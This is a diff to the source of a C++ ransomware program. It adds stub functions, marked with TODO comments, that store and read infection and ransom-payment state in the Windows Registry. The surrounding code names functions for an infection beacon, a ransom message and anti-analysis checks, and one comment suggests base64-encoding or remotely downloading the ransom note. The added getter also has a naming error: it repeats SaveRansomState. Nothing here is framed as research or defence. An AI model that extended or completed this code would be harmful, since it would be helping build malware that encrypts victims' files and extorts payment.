@@ -39,6 +39,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 void SendInfectionBeacon(DWORD dwEncryptedFileCount);
 void RansomMessage(DWORD dwEncryptedFileCount);
 bool AnalysisCheck();
+void SaveInfectionState(DWORD dwInfectionStatus);
+DWORD GetInfectionState();
+void SaveRansomState(DWORD dwRansomStatus);
+DWORD GetRansomState();
 void PrintProgress();
 std::string wstrtostr(const std::wstring& wstr);
 
@@ -209,6 +213,38 @@ void RansomMessage(DWORD dwEncryptedFileCount)
 	//
 	// The message text should be encoded (base64) if stored in the code,
 	// or it could be downloaded from a remote site
+}
+
+void SaveInfectionState(DWORD dwInfectionStatus)
+{
+	// TODO: Save infection status to the Registry
+	//       Create a Key+Value to store dwInfectionStatus
+	//       This can be used to avoid double infection
+}
+
+DWORD GetInfectionState()
+{
+	// TODO: Get infection status from the Registry
+	//       Read a Key+Value to get dwInfectionStatus
+	//       This can be used to avoid double infection
+
+	return 0;
+}
+
+void SaveRansomState(DWORD dwRansomStatus)
+{
+	// TODO: Save ransom status to the Registry
+	//       Create a Key+Value to store dwRansomStatus
+	//       This can be used to track whether the user paid or not
+}
+
+DWORD SaveRansomState()
+{
+	// TODO: Get ransom status from the Registry
+	//       Read a Key+Value to get dwRansomStatus
+	//       This can be used to track whether the user paid or not
+
+	return 0;
 }
 
 void PrintProgress()
